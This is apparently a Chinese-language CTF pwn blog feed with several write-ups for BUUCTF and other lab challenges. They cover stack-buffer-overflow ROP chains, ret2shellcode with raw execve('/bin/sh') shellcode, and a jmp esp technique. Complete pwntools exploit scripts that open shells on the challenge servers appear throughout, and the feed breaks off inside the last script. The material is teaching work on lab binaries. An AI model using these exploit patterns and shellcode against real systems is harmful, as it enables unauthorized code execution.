class="hljs-built_in">memset</span>(v8, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v8));<br>  *(_DWORD *)src = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v6, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v6));<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to use LFS.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input admin password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%100s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;administrator&quot;</span>) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Password Error!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your operation:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Add a log.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Display all logs.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Print all logs.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0.Exit\n:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>  <span class="hljs-keyword">switch</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> result;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-built_in">AddLog</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-built_in">Display</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-built_in">Print</span>();<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">GetFlag</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到向s1输入100个长度的字符，但是分配给s1的大小只有48，存在栈溢出。<br>并且选项4可以调用GetFlag函数。</p><p><strong>AddLog函数：</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __cdecl <span class="hljs-constructor">AddLog(<span class="hljs-params">int</span> <span class="hljs-params">a1</span>)</span><br>&#123;<br>  printf(<span class="hljs-string">&quot;Please input new log info:&quot;</span>);<br>  return <span class="hljs-constructor">__isoc99_scanf(<span class="hljs-string">&quot;%128s&quot;</span>, <span class="hljs-params">a1</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Display函数：</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">Display</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Print函数：</strong></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;echo Printing......&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有system函数了，但是参数不是我们想要的。</p><p><strong>GetFlag函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">GetFlag</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+0h] [ebp-48h] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">60</span>]; <span class="hljs-comment">// [esp+4h] [ebp-44h] BYREF</span><br><br>  *(_DWORD *)dest = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v3, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v3));<br>  <span class="hljs-built_in">strcpy</span>(dest, src);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The flag is your log:%s\n&quot;</span>, dest);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出flag就是我们的log，而选项1是可以自己输入log的。</p><p>所以大致逻辑就是我们在输入密码之后，首先选1，添加一个log，再选4调用flag，最后结束程序。</p><p>payload构造思路：</p><p><em>利用选择1之后的那一次输入，a1就是外面的src，程序给的大小是48，这边读入的时候读入了128长度的字符串，可以造成溢出，将程序的返回地址覆盖成system（‘&#x2F;bin&#x2F;sh’），然后选4去调用读取我们构造好的栈，获取shell</em></p><p>我们用如下命令查找‘&#x2F;bin&#x2F;sh’，但是找不到，继续找，找到‘sh’也是一样的效果。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">ROPgadget --<span class="hljs-built_in">binary</span> ciscn_2019_ne_5 --<span class="hljs-built_in">string</span> <span class="hljs-string">&#x27;sh&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/pwn3-3.png"></p><p>shell_addr&#x3D;0x80482ea</p><p>system函数的地址很容易找到为0x080484D0</p><p>有了这些可以构造payload了：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span>=<span class="hljs-variable">b</span><span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">48</span>+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">sys_addr</span>)+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;1111&#x27;</span>+<span class="hljs-title">p32</span>(<span class="hljs-variable">shell_addr</span>)</span><br><span class="hljs-variable">b</span><span class="hljs-string">&#x27;1111&#x27;</span>也可以写成<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x12121212</span>)</span><br></code></pre></td></tr></table></figure><p>之后选4去调用我们的这个构造好的栈即可获取shell。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&quot;node4.buuoj.cn&quot;,25746)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_ne_5&#x27;)<br><span class="hljs-attribute">system_addr</span>=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">shell_addr</span>=0x80482ea<br><br>r.recvuntil(b<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;administrator&#x27;</span>)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x48+4)+p32(system_addr)+b&#x27;1111&#x27;+p32(shell_addr)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;Please input new log info:&#x27;</span>)<br>r.sendline(payload)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>32/64位payload构造注意事项</title>
    <link href="/2023/09/18/32-64%E4%BD%8Dpayload%E6%9E%84%E9%80%A0%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <url>/2023/09/18/32-64%E4%BD%8Dpayload%E6%9E%84%E9%80%A0%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="堆栈平衡问题"><a href="#堆栈平衡问题" class="headerlink" title="堆栈平衡问题"></a>堆栈平衡问题</h2><p>32位中，没有堆栈平衡一说，而64位中有。payload中的堆栈平衡简单来说，就是要保证payload的字节数是16的倍数。而p64是将地址转为8字节的字符串，所以payload中得保证p64是偶数倍，就能满足堆栈平衡。因此对于写完payload后还是单数倍的p64时，就需要加单数个【当然加1个就行】p64(ret)，【ret代表ret指令的地址，可以直接在IDA里面任意找一个，也可以用ROPgadget来找】，因为ret的多少不会影响到函数的执行逻辑，所以用其来平衡。</p><h2 id="参数顺序"><a href="#参数顺序" class="headerlink" title="参数顺序"></a>参数顺序</h2><p><strong>32位中先写函数，再写参数</strong><br>参数可能是返回值，如调用system，需要多加个参数作返回值。最后一个函数都需要有返回值。<br>每个函数都有返回值，而我们对函数返回值不感兴趣【比如一些函数执行成功会返回1】只需要有个位置充当一下，而之前对于多个函数的解释也进一步得以优化，其应该是需要返回值的，只不过位置正好被其他的东西给占据了，如pop_这些用于给参数位置的rop链给一举两得给占据了，也就是说，即使是最后一个函数有参数，也不用在单独写一个p32(0)来填充返回值的位置，因为pop_已经将这件事给做了，例如payload &#x3D; cyclic(0x2c + 4) + p32(func1) + p32(func2) + p32(pop_ebx) + p32(0xACACACAC) + p32(flag) + p32(pop_ebx) + p32(0xBDBDBDBD)</p><p><strong>64位中先写参数，再写函数</strong></p><p>例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">x12</span> + <span class="hljs-number">4</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">system</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">sh</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">xa</span> + <span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi_ret</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sh</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">ret</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">system</span>)</span><br></code></pre></td></tr></table></figure><h2 id="参数存放位置"><a href="#参数存放位置" class="headerlink" title="参数存放位置"></a>参数存放位置</h2><p>在32位中，参数和返回值直接就存在栈中，但对于payload中有多个函数时，如果不是最后一个函数，则需要将其参数用寄存器来保存。</p><p>在64位中，函数参数一律得用寄存器来存储。64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。</p><p>例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">xa</span> + <span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">buf2</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">gets</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">buf2</span>)  + <span class="hljs-title">p64</span>(<span class="hljs-variable">system</span>)</span><br></code></pre></td></tr></table></figure><p>64位是用rdx、rsi、rdi三个寄存器传参，进行子函数调用时程序会先将子函数的参数存入rdx、rsi、rdi。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——输出flag.txt</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94%E8%BE%93%E5%87%BAflag-txt/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94%E8%BE%93%E5%87%BAflag-txt/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-not-the-same-3dsctf-2016）"><a href="#例题（BUUCTF-not-the-same-3dsctf-2016）" class="headerlink" title="例题（BUUCTF not_the_same_3dsctf_2016）"></a>例题（BUUCTF not_the_same_3dsctf_2016）</h2><h3 id="题目信息："><a href="#题目信息：" class="headerlink" title="题目信息："></a>题目信息：</h3><p><img src="/images/check0918.png"></p><p>主要函数有两个，后门函数：</p><p><img src="/images/main0918.png"></p><p>main函数：</p><p><img src="/images/back0918.png"></p><p>明显的栈溢出。后门函数像是读了flag.txt的内容到fl4g变量中，这个题应该是有好几种做法，先整理两种我看的懂的，还有一种是利用mprotect方法，这个我没太懂，后续再整理。。。</p><p>这两种做法思路都是将fl4g变量中的内容打印出来。</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p><strong>首先溢出到get_secret函数，再利用write()将fl4g参数中的内容读出来</strong></p><p>payload如下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs leaf">payload=&#x27;a&#x27;*0x2d+p32(0x80489a0)+p32(elf.symbols[&#x27;write&#x27;])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)<br><br>#0x2d个垃圾数据填充  get_secret函数的地址   write函数的地址    fl4g变量的位置   最后三个是write函数的参数（最后一个参数修改为45也可以）<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-variable">int</span> <span class="hljs-variable">filedes</span>, <span class="hljs-variable">const</span> <span class="hljs-variable">void</span> *<span class="hljs-variable">buf</span>, <span class="hljs-variable">size_t</span> <span class="hljs-variable">nbytes</span>)</span></span>;<br>#write 函数向 filedes 中写入 nbytes 字节数据，数据来源为 buf <br></code></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,26797)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./not&#x27;)<br><span class="hljs-attribute">flag_addr</span>=0x80eca2d<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*0x2d+p32(0x80489a0)+p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><strong>利用printf和exit输出fl4g</strong></p><p>首先找能打印出fl4g的函数，在这里找的是printf的地址</p><p><img src="/images/printf0918.png"></p><p>需要一个正常退出的函数，所以找找exit</p><p><img src="/images/exit_0918.png"></p><p>完整exp：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">from pwn import*<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28483</span>)<br><br>get_secret=<span class="hljs-number">0</span>x080489a0<br>flag=<span class="hljs-number">0</span>x080eca2d   <span class="hljs-comment">#fl4g变量的地址</span><br>printf=<span class="hljs-number">0</span>x0804f0a0<br><span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span>x0804e660<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x2d+p32(get_secret)+p32(printf)+p32(<span class="hljs-keyword">exit</span>)+p32(flag)  <span class="hljs-comment">#这里为什么fl4g变量的地址要放在最后一个？（读下一篇32/64参数顺序区别）</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ret2shellcode</title>
    <link href="/2023/09/14/Pwn%E2%80%94%E2%80%94ret2shellcode-BUUCTF-ciscn-2019-n-5-1/"/>
    <url>/2023/09/14/Pwn%E2%80%94%E2%80%94ret2shellcode-BUUCTF-ciscn-2019-n-5-1/</url>
    
    <content type="html"><![CDATA[<h2 id="例题1：BUUCTF-ciscn-2019-n-5"><a href="#例题1：BUUCTF-ciscn-2019-n-5" class="headerlink" title="例题1：BUUCTF ciscn_2019_n_5**"></a>例题1：BUUCTF ciscn_2019_n_5**</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/check.png"></p><p>查看题目信息，64位，没有开启任何保护。</p><p>拖到ida里，只有一个关键函数main函数：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> text[<span class="hljs-number">30</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me your name&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wow~ nice name!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to say to me?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(text);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>并且没有发现system和&#x2F;bin&#x2F;sh。</p><p>nc查看一下程序，有两个输入点，第一次让我们输入名字，限制输入长度为0x64，看一下name参数，发现name在全局变量bss段上</p><p><img src="/images/nc.png"></p><p><img src="/images/name.png"></p><p>第二次输入利用gets，没有限制长度，可以对v4造成溢出。</p><p><img src="/images/text.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>1.利用第一个输入点，往name参数里写入shellcode</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)</span></span>                   #用来导入pwntools模块<br>shellcode=<span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())                     #利用pwntools模块自动生成shellcode<br>r<span class="hljs-selector-class">.sendlineafter</span>(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)     #往name中写入shellcode<br></code></pre></td></tr></table></figure><p><strong>2.v4溢出到name参数地址，去执行shellcode拿到shell</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">payload=&#x27;a&#x27;*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>)                    <span class="hljs-comment">#让v4溢出到name参数地址</span><br>r.sendlineafter(&#x27;What do you want <span class="hljs-keyword">to</span> <span class="hljs-built_in">say</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">me</span>?&#x27;,payload)<br></code></pre></td></tr></table></figure><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,27058)<br><br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=&#x27;linux&#x27;)<br><span class="hljs-attribute">shellcode</span>=asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28+p64(0x601080)<br>r.sendlineafter(<span class="hljs-string">&#x27;What do you want to say to me?&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="例题2：https-oj-blue-whale-me-challenges-shellcode"><a href="#例题2：https-oj-blue-whale-me-challenges-shellcode" class="headerlink" title="例题2：https://oj.blue-whale.me/challenges#shellcode"></a>例题2：<a href="https://oj.blue-whale.me/challenges#shellcode">https://oj.blue-whale.me/challenges#shellcode</a></h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>checksec查看一下，</p><p><img src="/images/pwn8-1.png"></p><p>这里的Fortifiable之前没有注意过，但这里他的值为2说明开启了ASLR（是一种针对于缓冲区溢出的安全保护技术。），但就因为开启了这个技术，使得这个题目不能用常规方法做。需要一点点改动。</p><p>先看看反汇编代码：</p><p>程序很简单，main函数中就调用了下面这个函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">int <span class="hljs-built_in">sub_804851A</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[28]</span>; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch] BYREF</span><br><br>  <span class="hljs-built_in">sub_80484EB</span>();<br>  <span class="hljs-built_in">puts</span>(&quot;input your name&quot;);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>  <span class="hljs-built_in">printf</span>(&quot;hello &quot;);<br>  return <span class="hljs-built_in">printf</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf存在溢出，又因为本题题目就为shellcode，那很容易想到将shellcode发送过去就行。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">shellcode</span> <span class="hljs-operator">=</span> <span class="hljs-variable">b</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\x6e\x2f<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x68</span>\x2f\x2f<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span><span class="hljs-char escape_">\x89</span>\xe3<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x89</span>\xe2<span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x89</span>\xe1\xb0\x0b\xcd<span class="hljs-char escape_">\x80</span>&quot;</span><br><span class="hljs-variable">payload</span><span class="hljs-operator">=</span><span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">A</span>&#x27;<span class="hljs-operator">*</span>(<span class="hljs-number">0x1c</span><span class="hljs-operator">+</span><span class="hljs-number">4</span>)<span class="hljs-operator">+</span><span class="hljs-variable">shellcode</span><br></code></pre></td></tr></table></figure><p>但这样打不通，原因就是开启了ASLR，需要利用 jmp esp 使控制流转向栈上的 shellcode。</p><p><strong>jmp esp的原理</strong><br>见下图，在当前栈空间内进行堆栈清理返回到前一个栈空间时，会将esp指向old esp。<br>如果我们利用栈溢出，将返回地址覆盖为指令jmp esp的地址，那么在返回到jmp esp指令时，程序在下一步就会跳转到我们的old esp继续执行，那么我们的payload应该是这样布局的：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">payload = a*<span class="hljs-number">32</span> + p32(<span class="hljs-keyword">address </span>of <span class="hljs-keyword">jmp </span>esp) + 一系列<span class="hljs-keyword">NOP指令 </span>+ <span class="hljs-keyword">shellcode</span><br></code></pre></td></tr></table></figure><p>那么在跳转到old esp时，经过一系列NOP，程序最终执行shellcode.</p><p><img src="/images/pwn8-2.png"></p><p>jmp esp的地址可以通过ROPgadget查找<br><img src="/images/pwn8-3.png"></p><h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-keyword">import</span> <span class="hljs-operator">*</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-variable">p</span><span class="hljs-operator">=</span><span class="hljs-title function_">remote</span>(<span class="hljs-string">&quot;vps1.blue-whale.me&quot;</span>,<span class="hljs-number">9992</span>)<br><span class="hljs-comment">#elf=ELF(&quot;./pwn&quot;)</span><br><br><span class="hljs-variable">shellcode</span> <span class="hljs-operator">=</span> <span class="hljs-variable">b</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\x6e\x2f<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span><span 